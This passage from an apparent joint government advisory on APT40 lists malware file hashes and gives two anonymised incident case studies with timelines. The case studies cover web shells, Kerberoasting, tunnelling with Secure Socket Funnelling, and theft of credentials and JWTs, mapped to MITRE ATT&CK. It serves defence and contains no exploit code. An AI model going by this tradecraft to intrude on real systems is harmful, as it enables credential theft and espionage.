<p>APT40 has embraced the global trend of using compromised devices, including small-office/home-office (SOHO) devices, as operational infrastructure and last-hop redirectors [<a href=\"https://attack.mitre.org/techniques/T1584/008/\" title=\"Compromise Infrastructure: Network Devices\">T1584.008</a>] for its operations in Australia. This has enabled the authoring agencies to better characterize and track this group’s movements.</p>
<p>Many of these SOHO devices are end-of-life or unpatched and offer a soft target for N-day exploitation. Once compromised, SOHO devices offer a launching point for attacks that is designed to blend in with legitimate traffic and challenge network defenders [<a href=\"https://attack.mitre.org/techniques/T1001/003/\" title=\"Data Obfuscation: Protocol Impersonation\">T1001.003</a>].</p>
<p>This technique is also regularly used by other PRC state-sponsored actors worldwide, and the authoring agencies consider this to be a shared threat. For additional information, see joint advisories <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-158a\" title=\"People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices\">People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices</a> and <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a\" title=\"PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure\">PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure</a>.</p>
<p>APT40 does occasionally use procured or leased infrastructure as victim-facing C2 infrastructure in its operations; however, this tradecraft appears to be in relative decline.</p>
<h3>Tooling</h3>
<p>ASD’s ACSC are sharing some of the malicious files identified during the investigations outlined below. These files have been uploaded to VirusTotal to enable the wider network defense and cyber security communities to better understand the threats they need to defend against.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">MD5</th>
<th role=\"columnheader\">Filename</th>
<th role=\"columnheader\">Additional information</th>
</tr>
</thead>
<tbody>
<tr>
<td>26a5a7e71a601be991073c78d513dee3</td>
<td><a href=\"https://www.virustotal.com/gui/file/44369783a819a38909e89449495fb98c3f9ba07dd0d2fa55a24a560a89f21a86/details\" title=\"horizon.jsp\">horizon.jsp</a></td>
<td>1 kB | Java Source</td>
</tr>
<tr>
<td>87c88f06a7464db2534bc78ec2b915de</td>
<td><a href=\"https://www.virustotal.com/gui/file/b1cca678dbd6bd51e6e8e797b95dc3050a74f5fa8147603473d6229023f1eb1a/details\" title=\"Index_jsp$ProxyEndpoint$Attach.class\">Index_jsp$ProxyEndpoint$Attach.class</a></td>
<td>597 B | Java Bytecode</td>
</tr>
<tr>
<td>6a9bc68c9bc5cefaf1880ae6ffb1d0ca</td>
<td><a href=\"https://www.virustotal.com/gui/file/71f6b36bfddda2d3a506574991a44636f84df28f9350e7856d1cc8af07cdd821/details\" title=\"Index_jsp.class\">Index_jsp.class</a></td>
<td>5 kB | Java Bytecode</td>
</tr>
<tr>
<td>64454645a9a21510226ab29e01e76d39</td>
<td><a href=\"https://www.virustotal.com/gui/file/97daa26c59e0e151f66872147ccd30dd1815bc6e63ec40c288130c6e8a6ea992/details\" title=\"Index_jsp.java\">Index_jsp.java</a></td>
<td>5 kB | Java Source</td>
</tr>
<tr>
<td>e2175f91ce3da2e8d46b0639e941e13f</td>
<td><a href=\"https://www.virustotal.com/gui/file/1a2282cc4c13bd24b2ca20c494cacbd283fbdcc4864d9cde26ea55db800f4dda/details\" title=\"Index_jsp$ProxyEndpoint.class\">Index_jsp$ProxyEndpoint.class</a></td>
<td>4 kB | Java Bytecode</td>
</tr>
<tr>
<td>9f89f069466b8b5c9bf25c9374a4daf8</td>
<td><a href=\"https://www.virustotal.com/gui/file/0e3324587a07df499e97b58076a94e86bf5598cc6d9606c2dcee3941175ff043/details\" title=\"Index_jsp$ProxyEndpoint$1.class\">Index_jsp$ProxyEndpoint$1.class</a></td>
<td>3 kB | Java Bytecode</td>
</tr>
<tr>
<td>187d6f2ed2c80f805461d9119a5878ac</td>
<td><a href=\"https://www.virustotal.com/gui/file/2aad0f8b439c3824d51871a0744c0e2f578277e0ec73effe5a24c49d8048bc74/details\" title=\"Index_jsp$ProxyEndpoint$2.class\">Index_jsp$ProxyEndpoint$2.class</a></td>
<td>1 kB | Java Bytecode</td>
</tr>
<tr>
<td>ed7178cec90ed21644e669378b3a97ec</td>
<td><a href=\"https://www.virustotal.com/gui/file/882f39945974aa5fc6005bf646ee3ab21bf69de12985d6ad8cc497dbfe520728/details\" title=\"Nova_jsp.class\">Nova_jsp.class</a></td>
<td>7 kB | Java Bytecode</td>
</tr>
<tr>
<td>5bf7560d0a638e34035f85cd3788e258</td>
<td><a href=\"https://www.virustotal.com/gui/file/b271e74ed44c3c405da858f29b6dfd4a99658dcac7bc83938079ad0dbbdf1b66/details\" title=\"Nova_jsp$TomcatListenerMemShellFromThread.class\">Nova_jsp$TomcatListenerMemShellFromThread.class</a></td>
<td>8 kB | Java Bytecode</td>
</tr>
<tr>
<td>e02be0dc614523ddd7a28c9e9d500cff</td>
<td><a href=\"https://www.virustotal.com/gui/file/7c7acd87b47d405da4d6efa2c43599148e12c094970ba198905f0a165d79a78f/details\" title=\"Nova_jsp.java\">Nova_jsp.java</a></td>
<td>15 kB | Java Source</td>
</tr>
</tbody>
</table>
<h3>Case Studies</h3>
<p>ASD’s ACSC are sharing two anonymized investigative reports to provide awareness of how the actors employ their tools and tradecraft.</p>
<h2><strong>Case Study 1</strong></h2>
<h5>This report has been anonymized to enable wider dissemination. The impacted organization is hereafter referred to as “the organization.” Some specific details have been removed to protect the identity of the victim and incident response methods of ASD’s ACSC.</h5>
<div>
<h3>Executive Summary</h3>
<p>This report details the findings of the ASD’s ACSC investigation into the successful compromise of the organization’s network between July and September 2022. This investigative report was provided to the organization to summarize observed malicious activity and frame remediation recommendations. The findings indicate the compromise was undertaken by APT40.</p>
<p>In mid-August, the ASD’s ACSC notified the organization of malicious interactions with their network from a likely compromised device being used by the group in late August and, with the organization’s consent, the ASD’s ACSC deployed host-based sensors to likely affected hosts on the organization’s network. These sensors allowed ASD’s ACSC incident response analysts to undertake a thorough digital forensics investigation. Using available sensor data, the ASD’s ACSC analysts successfully mapped the group’s activity and created a detailed timeline of observed events.</p>
<p>From July to August, key actor activity observed by the ASD’s ACSC included:</p>
<ul>
<li>Host enumeration, which enables an actor to build their own map of the network;</li>
<li>Web shell use, giving the actor an initial foothold on the network and a capability to execute commands; and</li>
<li>Deployment of other tooling leveraged by the actor for malicious purposes.</li>
</ul>
<p>The investigation uncovered evidence of large amounts of sensitive data being accessed and evidence that the actors moved laterally through the network [<a href=\"https://attack.mitre.org/techniques/T1021/002/\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a>]. Much of the compromise was facilitated by the group’s establishment of multiple access vectors into the network, the network having a flat structure, and the use of insecure internally developed software that could be used to arbitrarily upload files. Exfiltrated data included privileged authentication credentials that enabled the group to log in, as well as network information that would allow the actors to regain unauthorized access if the original access vector was blocked. No additional malicious tooling was discovered beyond those on the initially exploited machine; however, a group’s access to legitimate and privileged credentials would negate the need for additional tooling. Findings from the investigation indicate the organization was likely deliberately targeted by APT40, as opposed to falling victim opportunistically to a publicly known vulnerability.</p>
<h2><strong>Investigation Findings</strong></h2>
<p>In mid-August 2022, the ASD’s ACSC notified the organization that a confirmed malicious IP believed to be affiliated with a state-sponsored cyber group had interacted with the organization’s computer networks between at least July and August. The compromised device probably belonged to a small business or home user.</p>
<p>In late August, the ASD’s ACSC deployed a host-based agent to hosts on the organization’s network which showed evidence of having been impacted by the compromise.</p>
<p>Some artefacts which could have supported investigation efforts were not available due to the configuration of logging or network design. Despite this, the organization’s readiness to provide all available data enabled ASD’s ACSC incident responders to conduct comprehensive analysis and to form an understanding of likely APT40 activity on the network.</p>
<p>In September, after consultation with the ASD’s ACSC, the organization decided to denylist the IP identified in the initial notification. In October, the organization commenced remediation.</p>
<h3>Details</h3>
<p>Beginning in July, actors were able to test and exploit a custom web application [<a href=\"https://attack.mitre.org/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] running on <code>&lt;webapp&gt;2-ext</code>, which enables the group to establish a foothold in the network demilitarized zone (DMZ). This was leveraged to enumerate both the network as well as all visible domains. Compromised credentials [<a href=\"https://attack.mitre.org/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>] were used to query the Active Directory [<a href=\"https://attack.mitre.org/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>] and exfiltrate data by mounting file shares [<a href=\"https://attack.mitre.org/techniques/T1039/\" title=\"Data from Network Shared Drive\">T1039</a>] from multiple machines within the DMZ. The actor carried out a Kerberoasting attack in order to obtain valid network credentials from a server [<a href=\"https://attack.mitre.org/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a>]. The group were not observed gaining any additional points of presence in either the DMZ or the internal network.</p>
<h3>Visual Timeline</h3>
<p>The below timeline provides a broad overview of the key phases of malicious actor activity observed on the organization’s network.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/AA24-190A-apt40-advisory-visual-timeline-figure2.png?itok=lfBPL26D\" width=\"1024\" height=\"550\" alt=\"Figure 2: APT40 Advisory Visual Timeline\">


</div>
  </figure>
<h3>Detailed Timeline</h3>
<p><strong>July:</strong> The actors established an initial connection to the front page of a custom web application [<a href=\"https://attack.mitre.org/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] built for the organization (hereafter referred to as the “web application” or “<code><em>webapp</em></code>”) via a transport layer security (TLS) connection [<a href=\"https://attack.mitre.org/techniques/T1102/\" title=\"Web Service\">T1102</a>]. No other noteworthy activity was observed.</p>
<p><strong>July:</strong> The actors begin enumerating the web application’s website looking for endpoints[2] to further investigate.</p>
<p><strong>July:</strong> The actors concentrate on attempts to exploit a specific endpoint.</p>
<p><strong>July:</strong> The actors are able to successfully&nbsp;POST&nbsp;to the web server, probably via a web shell placed on another page. A second IP, likely employed by the same actors, also begins posting to the same URL. The actors created and tested a number of likely web shells.&nbsp;</p>
<p>The exact method of exploitation is unknown, but it is clear that the specific endpoint was targeted to create files on&nbsp;<code><em>&lt;webapp&gt;2</em>-ext</code>.</p>
<p>ASD's ACSC believes that the two IP address connections were part of the same intrusion due to their shared interest and initial connections occurring minutes apart.</p>
<p><strong>July:</strong> The group continue to conduct host enumeration, looking for privilege escalation opportunities, and deploying a different web shell. The actors log into the web application using compromised credentials for&nbsp;<code><em>&lt;firstname.surname&gt;</em>@<em>&lt;organisation domain&gt;</em></code>.</p>
<p>The actors’ activity does not appear to have successfully achieved privilege escalation on&nbsp;<code><em>&lt;webapp&gt;2</em>-ext</code>. Instead, the actors pivoted to network-based activity.</p>
<p><strong>July:</strong>&nbsp;The actor tests the compromised credentials for a service account[3] which it likely found hardcoded in internally accessible binaries.</p>
<p><strong>July:</strong> The actors deploy the open-source tool Secure Socket Funnelling, which was used to connect out to the malicious infrastructure. This connection is employed to tunnel traffic from the actor's attack machines into the organization’s internal networks, whose machine names are exposed in event logs as they attempt to use the credentials for the service account.</p>
<p><strong>August:</strong> The actors are seen conducting a limited amount of activity, including failing to establish connections involving the service account.</p>
<p><strong>August:</strong> The actors perform significant network and Active Directory enumeration. A different compromised account is subsequently employed to mount shares[4] on Windows machines within the DMZ, enabling successful data exfiltration.</p>
<p>This seems to be opportunistic usage of a stolen credential on mountable machines in the DMZ. Firewalls blocked the actor from targeting the internal network with similar activity.</p>
<p><strong>August – September:</strong> The SSF tool re-established a connection to a malicious IP. The group are not observed performing any additional activities until their access is blocked.</p>
<p><strong>September:</strong> The organization blocks the malicious IP by denylisting it on their firewalls.</p>
<h2><strong>Actor Tactics and Techniques</strong></h2>
<p>The MITRE ATT&amp;CK framework is a documented collection of tactics and techniques employed by threat actors in cyberspace. The framework was created by U.S. not-for-profit The MITRE Corporation and functions as a common global language around threat actor behavior.</p>
<p>The ASD’s ACSC assesses the following techniques and tactics to be relevant to the actor’s malicious activity:</p>
<h3>Reconnaissance</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a> – Search Victim-Owned Websites</p>
<p>The actor enumerated the custom web application’s website to identify opportunities for accessing the network.</p>
<h3>Initial Access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a> – Exploit Public-Facing Application (regarding exploiting the custom web application)</p>
<p><a href=\"https://attack.mitre.org/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a> – Valid Accounts: Domain Accounts (regarding logging on with comprised credentials)</p>
<p>Exploiting internet-exposed custom web applications provided an initial point of access for the actor. The actor was later able to use credentials they had compromised to further their access to the network.</p>
<h3>Execution</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1059\" title=\"Command and Scripting Interpreter\">T1059</a> – Command and Scripting Interpreter (regarding command execution through the web shell)</p>
<p><a href=\"https://attack.mitre.org/techniques/T1072/\" title=\"Software Deployment Tools\">T1072</a> – Software Deployment Tools (regarding the actor using open-source tool Secure Socket Funnelling (SSF) to connect to an IP)</p>
<h3>Persistence</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a> – Server Software Component: Web Shell (regarding use of a web shell and SSF to establish access)</p>
<h3>Credential Access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1552/001/\" title=\"Credentials from Password Stores\">T1552.001</a> – Credentials from Password Stores (regarding password files relating to building management system [BMS])</p>
<p><a href=\"https://attack.mitre.org/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a> – Steal or Forge Kerberos Tickets: Kerberoasting (regarding attack to gain network credentials)</p>
<h3>Lateral movement</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1021/002/\" title=\"Remote Services: SMB Shares\">T1021.002</a> – Remote Services: SMB Shares (regarding the actor mounting SMB shares from multiple devices)</p>
<h3>Collection</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1213/\" title=\"Data from Information Repositories\">T1213</a> – Data from Information Repositories (regarding manuals/documentation found on the BMS server)</p>
<h3>Exfiltration</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1041/\" title=\"Exfiltration Over C2 Channel\">T1041</a> – Exfiltration Over C2 Channel (regarding the actor’s data exfiltration from Active Directory and mounting shares)</p>
<h2><strong>Case Study 2</strong></h2>
<h5>This report has been anonymized to enable wider dissemination. The impacted organization is hereafter referred to as “the organization.” Some specific details have been removed to protect the identity of the victim and incident response methods of ASD’s ACSC.</h5>
<h3>Executive Summary</h3>
<p>This report details the findings of ASD’s ACSC investigation into the successful compromise of the organization’s network in April 2022. This investigation report was provided to the organization to summarize observed malicious activity and frame remediation recommendations. The findings indicate the compromise was undertaken by APT40.</p>
<p>In May 2022, ASD’s ACSC notified an organization of suspected malicious activity impacting the organization’s network since April 2022. Subsequently, the organization informed ASD's ACSC that they had discovered malicious software on an internet‑facing server which provided the login portal for the organization’s corporate remote access solution. This server used a remote access login and identity management product and will be referred to in this report as 'the compromised appliance'. This report details the investigation findings and remediation advice developed for the organization in response to the investigation conducted by the ASD’s ACSC.</p>
<p>Evidence indicated that part of the organization’s network had been compromised by malicious cyber actor(s) via the organization’s remote access login portal since at least April 2022. This server may have been compromised by multiple actors, and was likely affected by a remote code execution (RCE) vulnerability that was widely publicized around the time of the compromise.</p>
<p>Key actor activity observed by the ASD’s ACSC included:</p>
<ul>
<li>Host enumeration, which enables an actor to build their own map of the network;</li>
<li>Exploitation of internet-facing applications and web shell use, giving the actor an initial foothold on the network and a capability to execute commands;</li>
<li>Exploitation of software vulnerabilities to escalate privileges; and</li>
<li>Credential collection to enable lateral movement.</li>
</ul>
<p>The ASD’s ACSC discovered that a malicious actor had exfiltrated several hundred unique username and password pairs on the compromised appliance in April 2022, as well as a number of multi-factor authentication codes and technical artefacts related to remote access sessions. Upon a review by the organization, the passwords were found to be legitimate. The ASD’s ACSC assesses that the actor may have collected these technical artefacts to hijack or create a remote login session as a legitimate user, and access the organization’s internal corporate network using a legitimate user account.</p>
<h3>Investigation Summary</h3>
<p>The ASD’s ACSC determined that the actor compromised appliance(s) which provide remote login sessions for organization staff and used this compromise to attempt to conduct further activity. These appliances consist of three load-balanced hosts where the earliest evidence of compromise was detected. The organization shut down two of the three load-balanced hosts shortly after the initial compromise. As a result, all subsequent activity occurred on a single host. The other servers associated with the compromised appliance were also load-balanced in a similar manner. For legibility, all compromised appliances are referred to in most of this report as a “single appliance.”</p>
<p>The actor is believed to have used publicly known vulnerabilities to deploy web shells to the compromised appliance from April 2022 onwards. Threat actors from the group are assessed to have attained escalated privileges on the appliance. The ASD’s ACSC could not determine the full extent of the activity due to lack of logging availability. However, evidence on the device indicates that an actor achieved the following:</p>
<ul>
<li>The collection of several hundred genuine username and password pairs; and</li>
<li>The collection of technical artefacts which may have allowed a malicious actor to access a virtual desktop infrastructure (VDI) session as a legitimate user.</li>
</ul>
<p>The ASD’s ACSC assesses that the actor would have sought to further the compromise of the organisation network. The artefacts exfiltrated by the actor may have allowed them to hijack or initiate virtual desktop sessions as a legitimate user, possibly as a user of their choice, including administrators. The actor may have used this access vector to further compromise organization services to achieve persistence and other goals.</p>
<p>Other organization appliances within the hosting provider managed environment did not show evidence of compromise.</p>
<h3>Access</h3>
<p>The host with the compromised appliance provided authentication via Active Directory and a webserver, for users connecting to VDI sessions [<a href=\"https://attack.mitre.org/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>].</p>
<table>
<tbody>
<tr>
<td><strong>Location</strong></td>
<td>Compromised appliance hostnames (load-balanced)</td>
</tr>
<tr>
<td><strong>Datacentre 1</strong></td>
<td>HOST1, HOST2, HOST3</td>
</tr>
</tbody>
</table>
<p>The appliance infrastructure also included access gateway hosts that provide a tunnel to the VDI for the user, once they possess an authentication token generated and downloaded from the appliance.</p>
<p>There was no evidence of compromise of any of these hosts. However, the access gateway hosts logs showed evidence of significant interactions with known malicious IP addresses. It is likely that this reflected activity that occurred on this host, or network connections with threat actor infrastructure that reached this host. The nature of this activity could not be determined using available evidence but indicates that the group sought to move laterally in the organization’s network [<a href=\"https://attack.mitre.org/tactics/TA0008/\" title=\"Lateral Movement\">TA0008</a>].</p>
<p>Internal Hosts</p>
<p>The ASD’s ACSC investigated limited data from the internal organization’s network segment. Attempted or successful malicious activity known to have impacted the internal organization’s network segment includes actor access to VDI-related artefacts, the scraping of an internal SQL server [<a href=\"https://attack.mitre.org/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a>], and unexplained traffic observed going from known malicious IP addresses through the access gateway appliances [<a href=\"https://attack.mitre.org/tactics/TA0011/\" title=\"Command and Control\">TA0011</a>].</p>
<p>Using their access to the compromised appliance, the group collected genuine usernames, passwords [<a href=\"https://attack.mitre.org/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>], and MFA token values [<a href=\"https://attack.mitre.org/techniques/T1111/\" title=\"Multi-Factor Authentication Interception\">T1111</a>]. The group also collected JSON Web Tokens (JWTs) [<a href=\"https://attack.mitre.org/techniques/T1528/\" title=\"Steal Application Access Token\">T1528</a>], which is an authentication artefact used to create virtual desktop login sessions. The actor may have been able to use these to create or hijack virtual desktop sessions [<a href=\"https://attack.mitre.org/techniques/T1563/002/\" title=\"Remote Service Session Hijacking: RDP Hijacking\">T1563.002</a>] and access the internal organization network segment as a legitimate user [<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].</p>
<p>The actor also used access to the compromised appliance to scrape an SQL server [<a href=\"https://attack.mitre.org/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a>], which resided in the organization’s internal network. It is likely that the actor had access to this data.</p>
<p>Evidence available from the access gateway appliance revealed that network traffic occurred through or to this device from known malicious IP addresses. As described above, this may indicate that malicious cyber actors impacted or utilized this device, potentially to pivot into the internal network.</p>
<h3>Investigation Timeline</h3>
<p>The below list provides a timeline of key activities discovered during the investigation.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Time</strong></th>
<th role=\"columnheader\"><strong>Event</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>Known&nbsp;malicious&nbsp;IP&nbsp;addresses&nbsp;interact&nbsp;with&nbsp;access&nbsp;gateway host&nbsp;HOST7.&nbsp;The&nbsp;nature&nbsp;of&nbsp;the interactions&nbsp;could&nbsp;not&nbsp;be&nbsp;determined.</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>All&nbsp;hosts,&nbsp;HOST1, HOST2&nbsp;and&nbsp;HOST3, were&nbsp;compromised&nbsp;by&nbsp;a&nbsp;malicious&nbsp;actor&nbsp;or&nbsp;actors, and&nbsp;web&nbsp;shells&nbsp;were&nbsp;placed&nbsp;on&nbsp;the&nbsp;hosts.</p>
<p>A&nbsp;log&nbsp;file&nbsp;was created&nbsp;or&nbsp;modified&nbsp;on HOST2.&nbsp;This&nbsp;file contains&nbsp;credential&nbsp;material&nbsp;likely captured&nbsp;by&nbsp;a&nbsp;malicious&nbsp;actor.</p>
<p>The&nbsp;/etc/security/opasswd&nbsp;and&nbsp;/etc/shadow&nbsp;files were&nbsp;modified&nbsp;on&nbsp;HOST1&nbsp;and&nbsp;HOST3, indicating&nbsp;that&nbsp;passwords&nbsp;were&nbsp;changed.&nbsp;Evidence&nbsp;available&nbsp;on&nbsp;HOST1 suggests&nbsp;that&nbsp;the password for user ‘sshuser’ was changed.</p>
</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>HOST2&nbsp;was&nbsp;shut&nbsp;down by&nbsp;the&nbsp;organization.</p>
<p>Additional&nbsp;web&nbsp;shells&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>)&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;and&nbsp;HOST3.&nbsp;HOST1experienced SSH brute force attempts from HOST3.</p>
<p>A&nbsp;log&nbsp;file&nbsp;was&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>)&nbsp;on&nbsp;HOST3.&nbsp;This file&nbsp;contains&nbsp;credential&nbsp;material&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>) likely captured by a malicious actor.</p>
<p>JWTs&nbsp;were&nbsp;captured&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1528/\" title=\"Steal Application Access Token\">T1528</a>)&nbsp;and&nbsp;output&nbsp;to&nbsp;a&nbsp;file&nbsp;on&nbsp;HOST3.</p>
<p>HOST3&nbsp;was&nbsp;shut&nbsp;down&nbsp;by&nbsp;the&nbsp;organization.&nbsp;All&nbsp;activity&nbsp;after&nbsp;this&nbsp;time&nbsp;occurs&nbsp;on&nbsp;HOST1.</p>
</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>Additional&nbsp;web&nbsp;shells&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).&nbsp;JWTs&nbsp;were&nbsp;captured&nbsp;and&nbsp;output to&nbsp;a&nbsp;file&nbsp;on&nbsp;HOST1.</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>Additional&nbsp;web&nbsp;shells are&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>),&nbsp;and a&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address interacts&nbsp;with&nbsp;the&nbsp;host&nbsp;(<a href=\"https://attack.mitre.org/tactics/TA0011/\" title=\"Command and Control\">TA0011</a>).</p>
<p>A&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;interacts&nbsp;with&nbsp;access&nbsp;gateway&nbsp;host&nbsp;HOST7.</p>
</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>
<p>A known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;interacted&nbsp;with&nbsp;access&nbsp;gateway host&nbsp;HOST7&nbsp;(<a href=\"https://attack.mitre.org/tactics/TA0011/\">TA0011</a>).</p>
<p>An&nbsp;authentication&nbsp;event&nbsp;for&nbsp;a&nbsp;user&nbsp;is&nbsp;linked&nbsp;to&nbsp;a&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;in&nbsp;logs on HOST1.&nbsp;An&nbsp;additional&nbsp;web&nbsp;shell&nbsp;is&nbsp;created&nbsp;on&nbsp;this&nbsp;host&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).</p>
</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>A&nbsp;script on&nbsp;HOST1&nbsp;was modified&nbsp;by&nbsp;an&nbsp;actor&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1543/\" title=\"Create or Modify System Process\">T1543</a>).&nbsp;This script&nbsp;contains&nbsp;functionality which would have scraped data from an internal SQL server.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>An&nbsp;additional&nbsp;log&nbsp;file&nbsp;on&nbsp;HOST1&nbsp;was&nbsp;last&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>).&nbsp;This&nbsp;file&nbsp;contains&nbsp;username&nbsp;and password&nbsp;pairs&nbsp;for the&nbsp;organization&nbsp;network,&nbsp;which&nbsp;are&nbsp;believed&nbsp;to&nbsp;be&nbsp;legitimate&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>).</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>An&nbsp;additional log&nbsp;file&nbsp;was&nbsp;last&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>).&nbsp;This&nbsp;file&nbsp;contains&nbsp;JWTs&nbsp;collected&nbsp;from HOST1.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>Additional&nbsp;web&nbsp;shells&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).&nbsp;On&nbsp;this&nbsp;date, the&nbsp;organization reported&nbsp;the&nbsp;discovery&nbsp;of&nbsp;a&nbsp;web&nbsp;shell&nbsp;with&nbsp;creation&nbsp;date&nbsp;in&nbsp;April 2022&nbsp;to&nbsp;ASD’s ACSC</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>A&nbsp;number&nbsp;of&nbsp;scripts were&nbsp;created&nbsp;on HOST1,&nbsp;including&nbsp;one named&nbsp;Log4jHotPatch.jar.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>The&nbsp;iptables-save&nbsp;command was&nbsp;used&nbsp;to&nbsp;add&nbsp;two&nbsp;open&nbsp;ports to&nbsp;the&nbsp;access gateway&nbsp;host. The&nbsp;ports&nbsp;were&nbsp;9998&nbsp;and&nbsp;9999&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>).</td>
</tr>
</tbody>
</table>
<h2><strong>Actor Tactics and Techniques</strong></h2>
<p>Highlighted below are several tactics and techniques identified during the investigation.</p>
<h3>Initial&nbsp;access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a>&nbsp;Exploit&nbsp;public&nbsp;facing&nbsp;application</p>
<p>The group likely exploited RCE, privilege escalation, and&nbsp;authentication&nbsp;bypass&nbsp;vulnerabilities&nbsp;in&nbsp;the&nbsp;remote&nbsp;access&nbsp;login&nbsp;and&nbsp;identity&nbsp;management&nbsp;product&nbsp;to&nbsp;gain initial access to the network.</p>
<p>This&nbsp;initial&nbsp;access&nbsp;method&nbsp;is considered&nbsp;the most&nbsp;likely&nbsp;due to the following:</p>
<ul>
<li>The&nbsp;server&nbsp;was&nbsp;vulnerable&nbsp;to&nbsp;these&nbsp;CVEs&nbsp;at&nbsp;the time;</li>
<li>Attempts&nbsp;to&nbsp;exploit&nbsp;these&nbsp;vulnerabilities&nbsp;from&nbsp;known actor infrastructure; and</li>
<li>The first known internal malicious activity occurred&nbsp;shortly&nbsp;after&nbsp;attempted&nbsp;exploitation attempts were made.</li>
</ul>
<h3>Execution</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1059/004\" title=\"Command and Scripting Interpreter: Unix Shell\">T1059.004</a>&nbsp;Command&nbsp;and Scripting&nbsp;Interpreter:&nbsp;Unix Shell</p>
<p>The group successfully exploited the above vulnerabilities&nbsp;may&nbsp;have&nbsp;been&nbsp;able&nbsp;to&nbsp;run&nbsp;commands in a Unix shell available on the affected appliance.</p>
<p>Complete details of the commands run by actors cannot&nbsp;be&nbsp;provided&nbsp;as&nbsp;they&nbsp;were&nbsp;not&nbsp;logged&nbsp;by&nbsp;the appliance.</p>
<h3>Persistence</h3>
